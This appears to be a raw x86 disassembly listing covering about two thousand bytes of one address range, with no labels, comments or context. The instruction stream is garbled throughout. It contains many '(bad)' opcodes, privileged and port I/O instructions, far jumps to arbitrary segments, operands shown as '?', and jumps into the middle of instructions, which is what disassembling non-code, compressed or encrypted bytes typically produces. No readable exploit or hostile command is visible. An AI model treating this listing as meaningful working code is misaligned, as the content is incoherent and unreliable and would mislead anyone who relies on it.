  414f5e:	adc    ebx,DWORD PTR [esi+0xd]
  414f61:	retf   0xeec7
  414f64:	inc    edx
  414f65:	xchg   ebx,eax
  414f66:	adc    DWORD PTR [eax],eax
  414f68:	cmp    ebp,DWORD PTR [ecx]
  414f6a:	add    bh,bl
  414f6c:	sub    bh,0x7d
  414f6f:	lock push edi
  414f71:	popa   
  414f72:	cmp    BYTE PTR [edx+edx*2],dl
  414f75:	test   BYTE PTR [esi+0x55],bl
  414f78:	jnp    0x414f31
  414f7a:	es push 0x55
  414f7d:	push   ebx
  414f7e:	fucom  st(3)
  414f80:	les    ebx,FWORD PTR [ebx+0x28]
  414f83:	and    DWORD PTR [ebp-0xb962b6a],0x4262ef97
  414f8d:	aas    
  414f8e:	or     al,0x50
  414f90:	shl    ecx,0x71
  414f93:	cmp    dl,dh
  414f95:	(bad)  
  414f96:	add    BYTE PTR [edx],bl
  414f98:	or     BYTE PTR [edx],dl
  414f9a:	cs out dx,al
  414f9c:	js     0x414f81
  414f9e:	dec    edx
  414f9f:	loopne 0x414fb8
  414fa1:	jmp    0x37d26606
  414fa6:	(bad)  
  414fa7:	loopne 0x414f39
  414fa9:	loope  0x414fa7
  414fab:	imul   ebp,DWORD PTR [esi+0x41eb3c0b],0x4745981b
  414fb5:	test   al,0x3f
  414fb7:	mov    edi,0x8e071943
  414fbc:	mov    edx,0x3a3bf660
  414fc1:	mov    ds:0x3b8daed6,eax
  414fc6:	arpl   WORD PTR [edi+0x5dc40195],sp
  414fcc:	mov    esp,0xa4d0c825
  414fd1:	xchg   DWORD PTR [edi],ebp
  414fd3:	fidivr WORD PTR [eax-0x101534ed]
  414fd9:	jb     0x414fab
  414fdb:	imul   eax,edi,0xffffffb1
  414fde:	in     al,dx
  414fdf:	jle    0x415024
  414fe1:	xor    eax,0x1fb62373
  414fe6:	mov    edi,0x5d916ec6
  414feb:	rol    DWORD PTR [edi],0xe0
  414fee:	imul   esi,DWORD PTR [edi+0x31],0x135703ed
  414ff5:	cmp    eax,0x88115b1f
  414ffa:	push   ds
  414ffb:	inc    eax
  414ffc:	call   0x8b0a9e14
  415001:	int3   
  415002:	repz les eax,FWORD PTR [ecx+ecx*2]
  415006:	mov    gs,WORD PTR [edi+0x5eb51b6b]
  41500c:	add    dh,bh
  41500e:	lods   eax,DWORD PTR ds:[esi]
  41500f:	jns    0x414fed
  415011:	xchg   ebx,eax
  415012:	pusha  
  415013:	aas    
  415014:	repnz mov eax,ds:0x38d8e75b
  41501a:	aaa    
  41501b:	cwde   
  41501c:	mov    esi,0x559c293b
  415021:	daa    
  415022:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415024:	imul   eax,DWORD PTR [eax+ecx*2],0x47
  415028:	retf   
  415029:	out    dx,al
  41502a:	xor    al,0x3d
  41502c:	fwait
  41502d:	and    al,0x6
  41502f:	lods   eax,DWORD PTR ds:[esi]
  415030:	add    al,0xed
  415032:	fcomp  QWORD PTR [eax+0x674683e0]
  415038:	xlat   BYTE PTR ds:[ebx]
  415039:	fnstcw WORD PTR [eax+0x5c]
  41503c:	sbb    DWORD PTR ds:0x792d83a,ecx
  415042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415043:	bound  edx,QWORD PTR [esi+ebp*8-0x77]
  415047:	cli    
  415048:	sbb    dl,bh
  41504a:	jl     0x415015
  41504c:	adc    BYTE PTR [ecx],bl
  41504e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41504f:	rol    BYTE PTR [esi*1+0x1cd6245f],1
  415056:	ins    DWORD PTR es:[edi],dx
  415057:	sbb    ebx,DWORD PTR [esi+ebx*8-0x3b22fa68]
  41505e:	xlat   BYTE PTR ds:[ebx]
  41505f:	rcr    DWORD PTR [ebp+0x6],1
  415062:	call   0x38b9:0x9d16eca8
  415069:	pop    edx
  41506a:	cmp    eax,0x97a23c00
  41506f:	aaa    
  415070:	cmp    eax,0xbc8286ae
  415075:	outs   dx,BYTE PTR ds:[esi]
  415076:	cmp    al,ch
  415078:	push   esi
  415079:	sub    dl,BYTE PTR [ebp*4+0x79ef2409]
  415080:	je     0x41507e
  415082:	bound  esi,QWORD PTR [edi-0x76]
  415085:	inc    ebx
  415086:	test   BYTE PTR ds:0xa755ca3a,dh
  41508c:	mov    ch,0x38
  41508e:	adc    esi,DWORD PTR [ebp-0x78782c75]
  415094:	add    edi,ebx
  415096:	cmp    DWORD PTR [edx+0x67],0x10650876
  41509d:	aaa    
  41509e:	sbb    eax,0x6e4ad244
  4150a3:	cs mov esp,0x83471f54
  4150a9:	cmp    DWORD PTR ds:0x8acbbdd5,0xffffffbf
  4150b0:	add    al,0xd4
  4150b2:	xor    DWORD PTR [eax-0x67],edx
  4150b5:	cmp    eax,0x8bf12830
  4150ba:	ins    BYTE PTR es:[edi],dx
  4150bb:	scas   al,BYTE PTR es:[edi]
  4150bc:	push   ss
  4150bd:	mov    es,WORD PTR [edx+edi*4-0x1d]
  4150c1:	jmp    0x4dc7:0x74cb7121
  4150c8:	xlat   BYTE PTR ds:[ebx]
  4150c9:	ror    DWORD PTR [eax+ebp*8-0x68],cl
  4150cd:	in     al,0x72
  4150cf:	cmp    eax,DWORD PTR [edx+ebx*4+0x5b]
  4150d3:	pop    ebx
  4150d4:	or     al,BYTE PTR [ecx+0x3d5c3d93]
  4150da:	sbb    DWORD PTR ds:[edi],0x65
  4150de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150df:	addr16 mov dh,0xee
  4150e2:	rol    DWORD PTR [ebx-0x24db95ef],cl
  4150e8:	jbe    0x415136
  4150ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150eb:	mov    cl,0x9a
  4150ed:	dec    edx
  4150ee:	dec    edx
  4150ef:	icebp  
  4150f0:	dec    esi
  4150f1:	jp     0x4150f9
  4150f3:	mov    ah,0xbf
  4150f5:	adc    eax,0x4edbd2b5
  4150fa:	dec    esp
  4150fb:	mov    ah,0xb7
  4150fd:	rcl    ah,0x29
  415100:	jb     0x4150cc
  415102:	pop    ebx
  415103:	aas    
  415104:	jmp    0x23c7e4c9
  415109:	mov    ch,0x5c
  41510b:	jno    0x415170
  41510d:	in     al,0x1a
  41510f:	push   0xffffffab
  415111:	test   BYTE PTR [eax],0x12
  415114:	pushf  
  415115:	xchg   esi,eax
  415116:	lock adc ah,ch
  415119:	or     DWORD PTR [esi],0xffffff9b
  41511c:	lock sbb eax,0x515e6c49
  415122:	pop    ebp
  415123:	push   ds
  415124:	add    ecx,DWORD PTR [edx+0x34]
  415127:	cmp    edx,DWORD PTR [ecx]
  415129:	inc    esp
  41512a:	fdivr  st,st(6)
  41512c:	out    dx,al
  41512d:	(bad)  
  41512e:	jp     0x4150bc
  415130:	mov    dh,0x33
  415132:	xchg   BYTE PTR [eax+0x50c5748a],al
  415138:	and    DWORD PTR [eax-0x4b],ecx
  41513b:	mov    eax,0xeb252b84
  415140:	inc    eax
  415141:	adc    ebp,DWORD PTR [ecx-0x7d1256ae]
  415147:	cs push ebx
  415149:	xchg   ebx,eax
  41514a:	out    dx,eax
  41514b:	add    cl,BYTE PTR ds:0x383ec7b2
  415151:	add    ebp,ecx
  415153:	cmp    eax,esp
  415155:	push   edx
  415156:	lods   eax,DWORD PTR ds:[esi]
  415157:	fnstsw WORD PTR [esi+0x65]
  41515a:	pop    esp
  41515b:	ret    0x8385
  41515e:	fsubr  QWORD PTR [edi-0x38]
  415161:	add    dl,BYTE PTR [ecx]
  415163:	stos   BYTE PTR es:[edi],al
  415164:	cmc    
  415165:	(bad)  
  415166:	xchg   esi,eax
  415167:	or     eax,0xa15b28a
  41516c:	shl    WORD PTR [ebp+esi*1+0x7f],1
  415171:	mov    ebx,0xc38a3cbb
  415176:	dec    esp
  415177:	mov    WORD PTR [esi+0x43],ds
  41517a:	jb     0x41512b
  41517c:	jnp    0x415183
  41517e:	std    
  41517f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415180:	inc    ebp
  415181:	pop    esp
  415182:	sahf   
  415183:	lods   al,BYTE PTR ds:[esi]
  415184:	pop    esp
  415185:	mov    cl,0x84
  415187:	jle    0x415177
  415189:	ja     0x41511a
  41518b:	mov    eax,0x1e90151d
  415190:	adc    BYTE PTR [edx],ah
  415192:	xor    BYTE PTR [edx],al
  415194:	sub    DWORD PTR [edx],esp
  415196:	aas    
  415197:	dec    ecx
  415198:	push   ds
  415199:	push   ebp
  41519a:	cmp    eax,0x25ea7bbb
  41519f:	sbb    edi,esp
  4151a1:	push   ecx
  4151a2:	(bad)  
  4151a3:	js     0x415192
  4151a5:	xchg   edx,eax
  4151a6:	arpl   WORD PTR [edx+0x5d],dx
  4151a9:	(bad)  
  4151aa:	adc    DWORD PTR [edx-0x3a],esi
  4151ad:	mov    al,0x68
  4151af:	cmp    eax,0xbfa456e6
  4151b4:	ret    0x12
  4151b7:	xchg   esp,eax
  4151b8:	pop    edi
  4151b9:	adc    BYTE PTR [ebx-0x4e],0x9c
  4151bd:	jne    0x4151d6
  4151bf:	retf   0x764c
  4151c2:	mov    ah,ch
  4151c4:	iret   
  4151c5:	sti    
  4151c6:	mov    ds:0x62842c9f,eax
  4151cb:	dec    ecx
  4151cc:	adc    DWORD PTR [ecx+0x6b],0x151b4cf2
  4151d3:	out    dx,al
  4151d4:	mul    BYTE PTR [edi+0x1ad21efa]
  4151da:	jge    0x415188
  4151dc:	sti    
  4151dd:	xchg   DWORD PTR ds:0x698490c9,esp
  4151e3:	adc    al,0xe5
  4151e5:	xchg   ebp,eax
  4151e6:	mov    ch,0x8b
  4151e8:	lds    ebx,FWORD PTR [ebp-0x5a]
  4151eb:	add    DWORD PTR [edi+ebp*4-0x18],esi
  4151ef:	jge    0x415198
  4151f1:	mov    ah,0x16
  4151f3:	clc    
  4151f4:	mov    ecx,0x48899cb7
  4151f9:	out    dx,eax
  4151fa:	or     DWORD PTR [ecx-0x4e],eax
  4151fd:	push   edi
  4151fe:	push   edx
  4151ff:	icebp  
  415200:	cmp    al,0x59
  415202:	xchg   esi,eax
  415203:	gs push edx
  415205:	xchg   ebx,eax
  415206:	es add eax,0x75183b18
  41520c:	test   al,0x85
  41520e:	dec    edx
  41520f:	les    ebp,FWORD PTR [ecx+0x6a]
  415212:	cs add eax,0xc6a90219
  415218:	les    esp,FWORD PTR [eax+0x42a6d887]
  41521e:	stos   BYTE PTR es:[edi],al
  41521f:	add    ah,BYTE PTR [edi-0x4c]
  415222:	(bad)  
  415223:	icebp  
  415224:	xchg   BYTE PTR [ecx+0x79],al
  415227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415228:	rdmsr  
  41522a:	jecxz  0x415274
  41522c:	fwait
  41522d:	inc    eax
  41522e:	cmp    al,0x5e
  415230:	popa   
  415231:	pop    edx
  415232:	fisub  DWORD PTR [esp+ecx*2-0x6e15b0b]
  415239:	xchg   esi,eax
  41523a:	pop    esp
  41523b:	jns    0x4151d0
  41523d:	sub    al,0x8a
  41523f:	stc    
  415240:	cmp    eax,0x14305c6b
  415245:	mov    esp,0xaa6f54a4
  41524a:	adc    eax,0x3ceaa388
  41524f:	xor    BYTE PTR ds:0x3a2e66b2,0x5f
  415256:	cmp    DWORD PTR [ebx+0x50e3470d],0xd2cb56db
  415260:	xor    DWORD PTR [esi+0x2756d0b9],0xffffff96
  415267:	cmp    BYTE PTR [edx],bl
  415269:	sti    
  41526a:	push   cs
  41526b:	add    edx,edi
  41526d:	xor    BYTE PTR [eax+esi*8-0x13f8af83],cl
  415274:	mov    dl,0x4f
  415276:	jns    0x4152d6
  415278:	in     al,dx
  415279:	dec    edx
  41527a:	and    al,0xbc
  41527c:	test   al,0x27
  41527e:	stc    
  41527f:	and    dl,ch
  415281:	xchg   ebp,eax
  415282:	add    BYTE PTR [ecx+eax*8+0x62],ah
  415286:	sahf   
  415287:	rcl    ebx,1
  415289:	pop    edi
  41528a:	adc    esp,ebp
  41528c:	sub    eax,0x6ad6d95b
  415291:	(bad)  
  415292:	cld    
  415293:	rcl    DWORD PTR [eax],1
  415295:	pop    eax
  415296:	pop    edi
  415297:	dec    BYTE PTR [edi-0x6f]
  41529a:	xchg   dh,ah
  41529c:	pushf  
  41529d:	ret    
  41529e:	mov    dh,0x7c
  4152a0:	xchg   esi,eax
  4152a1:	out    dx,eax
  4152a2:	fistp  DWORD PTR [esi+0x72e49365]
  4152a8:	fimul  DWORD PTR [ecx+0x4f8d2ac9]
  4152ae:	hlt    
  4152af:	dec    edi
  4152b0:	mov    ds:0x5b985f4b,eax
  4152b5:	adc    esp,DWORD PTR [edi]
  4152b7:	(bad)  
  4152b8:	push   esi
  4152b9:	(bad)  
  4152ba:	aam    0xbe
  4152bc:	jne    0x415253
  4152be:	cld    
  4152bf:	ins    BYTE PTR es:[edi],dx
  4152c0:	adc    ebx,DWORD PTR [esp+eiz*2]
  4152c3:	paddsb mm6,QWORD PTR [edx-0x62]
  4152c7:	mov    al,ds:0x113d7c5f
  4152cc:	jmp    0x6cadccbc
  4152d1:	inc    ebx
  4152d2:	or     eax,0xfe908be9
  4152d7:	pusha  
  4152d8:	dec    esi
  4152d9:	test   bh,al
  4152db:	(bad)  
  4152dc:	ficom  DWORD PTR [esi+0xa]
  4152df:	inc    BYTE PTR [esi-0x32]
  4152e2:	mov    ds:0x5b3079fb,eax
  4152e7:	mov    edx,0x3c3b2200
  4152ec:	stos   DWORD PTR es:[edi],eax
  4152ed:	lds    esi,FWORD PTR [eax-0x1c]
  4152f0:	popf   
  4152f1:	xlat   BYTE PTR ds:[ebx]
  4152f2:	(bad)  
  4152f3:	sbb    ah,cl
  4152f5:	scas   eax,DWORD PTR es:[edi]
  4152f6:	push   edi
  4152f7:	enter  0xfac3,0xab
  4152fb:	stos   BYTE PTR es:[edi],al
  4152fc:	and    cl,BYTE PTR [eax-0x18]
  4152ff:	pop    esp
  415300:	xchg   edi,eax
  415301:	jae    0x415333
  415303:	mov    ebp,0xc3b42b0f
  415308:	cs add eax,0x17752d0f
  41530e:	int    0x6f
  415310:	mov    eax,ds:0xd3de0471
  415315:	xor    al,0x8e
  415317:	shl    BYTE PTR [esi+eiz*2-0x34],1
  41531b:	test   eax,0x3fe69a26
  415320:	hlt    
  415321:	lds    edi,FWORD PTR [esi+edi*1-0x3f891489]
  415328:	lea    esi,[eax+0x36]
  41532b:	(bad)  [esp+ebp*4-0x26ae84ad]
  415332:	xchg   esi,eax
  415333:	pop    esp
  415334:	rcr    BYTE PTR [esi-0x254921dc],0x19
  41533b:	nop
  41533c:	xchg   ebp,eax
  41533d:	mov    BYTE PTR [ecx-0x38],dh
  415340:	xchg   edx,eax
  415341:	iret   
  415342:	or     al,0x7a
  415344:	iret   
  415345:	lods   eax,DWORD PTR ds:[esi]
  415346:	mov    ch,BYTE PTR [ebx+ebp*1]
  415349:	jle    0x4153c3
  41534b:	es loopne 0x415314
  41534e:	out    0xe1,eax
  415350:	jns    0x41533f
  415352:	mov    DWORD PTR [eax],ebx
  415354:	iret   
  415355:	xor    DWORD PTR [esi+0x35],ebp
  415358:	or     ecx,ecx
  41535a:	iret   
  41535b:	clc    
  41535c:	lahf   
  41535d:	scas   eax,DWORD PTR es:[edi]
  41535e:	enter  0x4d2d,0x7e
  415362:	xor    dh,ch
  415364:	shl    al,0x0
  415367:	cmp    DWORD PTR [ebx-0x29654290],esp
  41536d:	gs push esi
  41536f:	fdivr  QWORD PTR [edi-0x69]
  415372:	fsubrp st(1),st
  415374:	or     dl,cl
  415376:	pushf  
  415377:	inc    esi
  415378:	mov    ebx,0xedc668e2
  41537d:	ds pop ds
  41537f:	test   al,ah
  415381:	add    eax,0x633f673
  415386:	gs or  dl,BYTE PTR es:[ebp+0x16]
  41538b:	dec    ebx
  41538c:	mov    ds:0xc9ef2d9b,al
  415391:	loop   0x4153e3
  415393:	cmp    DWORD PTR [ecx-0x49],eax
  415396:	and    al,0x6d
  415398:	outs   dx,BYTE PTR ds:[esi]
  415399:	call   0x35d0:0x65d0ed8a
  4153a0:	enter  0x11d,0xe7
  4153a4:	mov    BYTE PTR [eax-0x20ef3537],ch
  4153aa:	test   eax,0x601a2baf
  4153af:	sbb    ah,BYTE PTR [edi]
  4153b1:	sbb    ah,BYTE PTR [eax]
  4153b3:	xchg   esp,eax
  4153b4:	and    cl,cl
  4153b6:	or     edi,edx
  4153b8:	sub    cl,bh
  4153ba:	imul   esi,DWORD PTR [edi],0x953a162c
  4153c0:	test   BYTE PTR [eax+0x212015fe],bl
  4153c6:	(bad)  
  4153c7:	fimul  DWORD PTR [ebx+eax*1-0x12047d11]
  4153ce:	jnp    0x415448
  4153d0:	add    dh,BYTE PTR [ecx+0x71]
  4153d3:	inc    esp
  4153d4:	shl    DWORD PTR [ebx+edx*4-0x23],0x2
  4153d9:	ficomp WORD PTR [edi+esi*8-0x180ed611]
  4153e0:	dec    edx
  4153e1:	in     eax,dx
  4153e2:	add    eax,0xc6dd0a6f
  4153e7:	inc    edi
  4153e8:	and    al,BYTE PTR [ecx+ebp*2+0x53d5d3c0]
  4153ef:	push   cs
  4153f0:	mov    ds:0x560e5d86,al
  4153f5:	add    bh,BYTE PTR [eax+esi*1+0x12]
  4153f9:	inc    esi
  4153fa:	int    0x28
  4153fc:	and    DWORD PTR [esi+edx*2+0x63b3bba9],esi
  415403:	ret    0x2447
  415406:	dec    ebp
  415407:	jecxz  0x415398
  415409:	sti    
  41540a:	addr16 inc ebx
  41540c:	hlt    
  41540d:	rol    DWORD PTR [esi+0xfdd4f86],cl
  415413:	adc    al,0x72
  415415:	aas    
  415416:	out    dx,eax
  415417:	and    BYTE PTR [edx+esi*1],ah
  41541a:	jmp    0x73d1:0xaf5eaffe
  415421:	mov    ch,0x8e
  415423:	hlt    
  415424:	xchg   ebx,eax
  415425:	and    DWORD PTR [esi+0xb],edx
  415428:	xchg   BYTE PTR [eax+eax*1],ch
  41542b:	add    BYTE PTR [edi],cl
  41542d:	out    dx,eax
  41542e:	mov    dh,0x46
  415430:	pop    ebp
  415431:	pop    edi
  415432:	mov    cl,0xae
  415434:	jbe    0x4153c8
  415436:	jmp    0x4776:0xea30c59e
  41543d:	xor    eax,0xa2ed7aff
  415442:	pop    ss
  415443:	loop   0x41549c
  415445:	jecxz  0x415425
  415447:	adc    ebx,DWORD PTR ds:0xf643b290
  41544d:	mov    WORD PTR [eax+0x7580811a],ds
  415453:	lods   al,BYTE PTR ds:[esi]
  415454:	daa    
  415455:	fadd   DWORD PTR [esi+edi*8]
  415458:	push   edx
  415459:	clc    
  41545a:	pusha  
  41545b:	in     eax,dx
  41545c:	repz int 0xe
  41545f:	xchg   esp,eax
  415460:	ret    
  415461:	in     eax,0xb
  415463:	add    bl,bh
  415465:	sub    DWORD PTR [eax],esp
  415467:	and    eax,esp
  415469:	mov    WORD PTR [ebx+ecx*4+0x6b],?
  41546d:	stc    
  41546e:	das    
  41546f:	sbb    BYTE PTR [ecx],al
  415471:	adc    al,0x49
  415473:	and    BYTE PTR [edi+ecx*4],ah
  415476:	mov    edx,0x548470dd
  41547b:	push   ebx
  41547c:	mov    ecx,0x81dbb78f
  415481:	mov    ds:0x451a9029,eax
  415486:	iret   
  415487:	rcl    BYTE PTR [ecx],1
  415489:	or     cl,BYTE PTR [ecx-0x5d]
  41548c:	std    
  41548d:	xchg   ecx,eax
  41548e:	scas   al,BYTE PTR es:[edi]
  41548f:	mov    ecx,0xce5b5212
  415494:	push   esi
  415495:	lahf   
  415496:	not    esi
  415498:	sbb    cl,cl
  41549a:	mov    dh,0xf5
  41549c:	sbb    eax,0x28b101ce
  4154a1:	dec    ebp
  4154a2:	popa   
  4154a3:	iret   
  4154a4:	nop
  4154a5:	and    ebx,ecx
  4154a7:	ins    DWORD PTR es:[edi],dx
  4154a8:	and    eax,0xf65a6f5b
  4154ad:	sub    DWORD PTR [esi+ecx*1+0x24fb4700],edi
  4154b4:	jbe    0x415534
  4154b6:	sbb    BYTE PTR ds:0x70806f9f,ah
  4154bc:	test   DWORD PTR [eax],edx
  4154be:	stc    
  4154bf:	push   eax
  4154c0:	push   edi
  4154c1:	adc    eax,0x7dd8fc9a
  4154c6:	adc    DWORD PTR [eax-0x1a],ebx
  4154c9:	push   es
  4154ca:	push   0x9b539d51
  4154cf:	inc    esi
  4154d0:	or     dh,BYTE PTR [edi+0x1d00898e]
  4154d6:	lea    edi,[edi]
  4154d8:	in     al,0x30
  4154da:	fwait
  4154db:	hlt    
  4154dc:	in     al,0x4c
  4154de:	or     al,0x6e
  4154e0:	(bad)  
  4154e1:	clc    
  4154e2:	pop    edi
  4154e3:	pop    ebx
  4154e4:	pop    edx
  4154e5:	add    eax,0x22b5ab39
  4154ea:	pop    ecx
  4154eb:	cmp    eax,0xfbbabafe
  4154f0:	cmc    
  4154f1:	sub    ch,BYTE PTR [ebx+0x3a56d54a]
  4154f7:	push   edx
  4154f8:	cmp    eax,0xa0960903
  4154fd:	sub    cl,bh
  4154ff:	mov    cl,0xca
  415501:	fisttp DWORD PTR [ecx]
  415503:	sub    eax,0x77e5986d
  415508:	cmp    DWORD PTR [ebx+ebp*4],ecx
  41550b:	lods   al,BYTE PTR ds:[esi]
  41550c:	add    DWORD PTR [edx-0x70],ebp
  41550f:	in     eax,0x79
  415511:	adc    al,0x57
  415513:	push   ecx
  415514:	mov    WORD PTR [ecx-0x15221020],ds
  41551a:	xor    si,WORD PTR [ebx+0x7c]
  41551e:	aas    
  41551f:	loop   0x41552c
  415521:	pop    esp
  415522:	sar    DWORD PTR [eax+0x69],cl
  415525:	je     0x4154cc
  415527:	pop    edi
  415528:	mov    ebx,0xafe70d79
  41552d:	sub    BYTE PTR [ebp-0x30674949],dl
  415533:	cs jmp 0x4154d9
  415536:	scas   eax,DWORD PTR es:[edi]
  415537:	and    DWORD PTR [eax-0xb5f6438],esp
  41553d:	jg     0x415510
  41553f:	mov    bh,0x63
  415541:	inc    edx
  415542:	mov    WORD PTR [edi-0x308aa9d6],?
  415548:	in     al,0x55
  41554a:	pop    esi
  41554b:	jnp    0x41556e
  41554d:	js     0x41557a
  41554f:	inc    eax
  415550:	jp     0x4154df
  415552:	test   al,0xfc
  415554:	pusha  
  415555:	rcr    DWORD PTR [ecx+eax*1],cl
  415558:	push   ebx
  415559:	cmp    eax,0x20fd6e30
  41555e:	addr16 inc edx
  415560:	inc    edx
  415561:	call   0xcaa1:0x7f24b68
  415568:	mov    DWORD PTR [esi-0x6a],0x307f955
  41556f:	(bad)  
  415570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415571:	mov    edi,0xe54cfdf0
  415576:	jae    0x4155af
  415578:	pusha  
  415579:	fcomip st,st(7)
  41557b:	pop    esi
  41557c:	mov    WORD PTR [eax-0x6f],?
  41557f:	int3   
  415580:	push   ss
  415581:	out    0xb7,al
  415583:	pop    eax
  415584:	pop    ebp
  415585:	pushf  
  415586:	jns    0x4155c2
  415588:	xchg   ebx,eax
  415589:	aad    0x43
  41558b:	and    DWORD PTR [edi],0xffffffbd
  41558e:	aad    0xae
  415590:	fiadd  WORD PTR [edx]
  415592:	inc    ebx
  415593:	or     eax,0x5a6a7d62
  415598:	xchg   edx,eax
  415599:	xchg   edi,eax
  41559a:	adc    al,0x54
  41559c:	repnz outs dx,DWORD PTR gs:[esi]
  41559f:	add    bl,BYTE PTR [edi-0x61c4cd9a]
  4155a5:	push   0xbbec7869
  4155aa:	nop
  4155ab:	xchg   BYTE PTR [ebx+0xbdcf4e5],dl
  4155b1:	pop    eax
  4155b2:	lock aad 0x1c
  4155b5:	adc    esi,DWORD PTR [ebx]
  4155b7:	dec    ebp
  4155b8:	call   0x2665dc4
  4155bd:	shl    esp,cl
  4155bf:	mov    esi,0xd0b21109
  4155c4:	stos   DWORD PTR es:[edi],eax
  4155c5:	cmp    cl,BYTE PTR [ebx+0x7f]
  4155c8:	cmp    ch,cl
  4155ca:	dec    esi
  4155cb:	out    0xb9,al
  4155cd:	addr16 das 
  4155cf:	cdq    
  4155d0:	xor    BYTE PTR [ebp-0x26],ah
  4155d3:	inc    ebp
  4155d4:	je     0x41560d
  4155d6:	lahf   
  4155d7:	mov    al,ah
  4155d9:	das    
  4155da:	dec    ebx
  4155db:	sahf   
  4155dc:	cdq    
  4155dd:	jmp    0x2fa8:0xdd703a92
  4155e4:	adc    eax,0x1d7bf0cd
  4155e9:	shl    DWORD PTR [eax-0x6b10cccd],1
  4155ef:	imul   edi,ebx,0x42c5ab72
  4155f5:	dec    esp
  4155f6:	mov    DWORD PTR [ebx+0x782aab5b],0x9d4ad27f
  415600:	mov    ebp,ebp
  415602:	adc    edx,DWORD PTR [edx*8-0x76752a64]
  415609:	fistp  DWORD PTR [edx+edi*4]
  41560c:	aam    0xcd
  41560e:	les    esp,FWORD PTR [eax+0x16]
  415611:	pusha  
  415612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415613:	xor    BYTE PTR ds:0xb9c07d2d,bl
  415619:	dec    edi
  41561a:	je     0x415626
  41561c:	mov    ecx,0x49b54a6a
  415621:	dec    edi
  415622:	add    bl,BYTE PTR [edi]
  415624:	shl    BYTE PTR [ebp+0x58],1
  415627:	mov    cx,0x734e
  41562b:	lahf   
  41562c:	dec    ecx
  41562d:	in     al,0xf5
  41562f:	dec    esp
  415630:	add    esi,DWORD PTR [edx-0x5e]
  415633:	push   cs
  415634:	jmp    0xcaa9:0x2b3ed83b
  41563b:	or     DWORD PTR [ebp+0x3e],edi
  41563e:	ja     0x415657
  415640:	add    bh,BYTE PTR [ecx-0x36071cea]
  415646:	and    ebp,edx
  415648:	xchg   DWORD PTR [edx+0x75fddf00],ebx
  41564e:	mov    bl,0xeb
  415650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415651:	test   BYTE PTR [ecx+eax*4],0x80
  415655:	ret    
  415656:	sbb    DWORD PTR [ebx],edi
  415658:	gs (bad) 
  41565a:	repz jle 0x415634
  41565d:	jae    0x415619
  41565f:	call   0x2bee:0x528ad11c
  415666:	or     ah,BYTE PTR ds:0xaa7869ea
  41566c:	dec    ecx
  41566d:	sbb    edi,DWORD PTR [ebx+ecx*4+0x1be7591d]
  415674:	xchg   BYTE PTR [edx+0x50],bl
  415677:	std    
  415678:	sar    DWORD PTR [ebx],cl
  41567a:	inc    esp
  41567b:	mov    ds:0x4253b291,al
  415680:	jmp    0x6a992ecd
  415685:	lock pop esi
  415687:	mov    edi,0x6cb49db1
  41568c:	mul    BYTE PTR [edx-0x16]
  41568f:	add    DWORD PTR [edi],ebx
  415691:	mov    dl,0xa4
  415693:	popf   
  415694:	jmp    0x9770730b
  415699:	sbb    eax,0x6593cc67
  41569e:	mov    bh,0x68
  4156a0:	imul   ebx,DWORD PTR [eax-0x1b],0xa6470c68
  4156a7:	popa   
  4156a8:	push   ecx
  4156a9:	outs   dx,BYTE PTR ds:[esi]
  4156aa:	pop    ss
  4156ab:	ret    
  4156ac:	and    DWORD PTR [edx+0x1e],esp
  4156af:	add    DWORD PTR [ecx],esi
  4156b1:	push   ss
  4156b2:	add    edi,DWORD PTR [esp+edx*4+0x437d678f]
  4156b9:	mov    dh,0xf1
  4156bb:	pop    es
  4156bc:	aad    0x22
  4156be:	fidiv  DWORD PTR [edx+ebx*4-0x55cec53d]
  4156c5:	pop    edi
  4156c6:	add    edx,0xe5a3ecde
  4156cc:	pop    esp
  4156cd:	fwait
  4156ce:	retf   0xa93f
  4156d1:	jno    0x415730
  4156d3:	sub    ecx,DWORD PTR [ebx]
  4156d5:	add    BYTE PTR [edi+0x2fe2c427],0x2d
  4156dc:	scas   eax,DWORD PTR es:[edi]
  4156dd:	ror    BYTE PTR ss:[edi*1+0x56f7a8fc],0x4f
  4156e6:	cmp    DWORD PTR [ebx+0x1],0xd9e3b9e8
  4156ed:	out    0x6a,al
  4156ef:	push   ds
  4156f0:	call   0x3f3dee8e
  4156f5:	call   0xb738:0xe1b781cd
  4156fc:	xchg   edx,eax
  4156fd:	jmp    0x1974:0xcdb543d6
  415704:	ds mov bh,0x5b
  415707:	aam    0xa9
  415709:	(bad)  
  41570a:	sbb    DWORD PTR [eax+0x7f],edi
  41570d:	fiadd  DWORD PTR [ebx]
  41570f:	rcr    BYTE PTR [ebx],1
  415711:	mov    edi,0xceeb51ea
  415716:	sub    al,0x23
  415718:	nop
  415719:	fcomip st,st(5)
  41571b:	stos   DWORD PTR es:[edi],eax
  41571c:	test   al,0x2a
  41571e:	adc    ah,bh
  415720:	or     eax,0x270b294c
  415725:	or     al,0x91
  415727:	jl     0x41577d
  415729:	into   
  41572a:	int    0x65
  41572c:	dec    DWORD PTR [ebx-0x70]
  41572f:	xchg   esi,eax
  415730:	adc    edi,eax
  415732:	adc    DWORD PTR [edi],ebx
  415734:	mov    BYTE PTR [edx-0x76],bh
  415737:	push   ebx
  415738:	xchg   esi,eax
  415739:	and    esp,DWORD PTR [eax]
  41573b:	retf   
  41573c:	rcl    BYTE PTR [edi+ebp*4+0xb],0x6
  415741:	sbb    DWORD PTR [edx+0x52],edx
  415744:	adc    esp,ecx
  415746:	xchg   ecx,eax
  415747:	mov    al,al
  415749:	mov    DWORD PTR cs:[bp-0x13e],eax
  41574f:	mov    eax,ds:0x9c9f0644
  415754:	shr    ch,1
  415756:	push   ss
  415757:	retf   0x2360
  41575a:	cdq    
  41575b:	and    DWORD PTR [ecx-0x6],0xffffff84
  41575f:	jnp    0x4157a3
  415761:	push   cs
  415762:	sar    DWORD PTR [edi+ebx*4-0x13],cl
  415766:	mov    al,ds:0xb3b07887
  41576b:	aaa    
  41576c:	mov    WORD PTR [edi-0x2f],?
  41576f:	js     0x41576c
  415771:	mov    ds:0x4c953ede,al
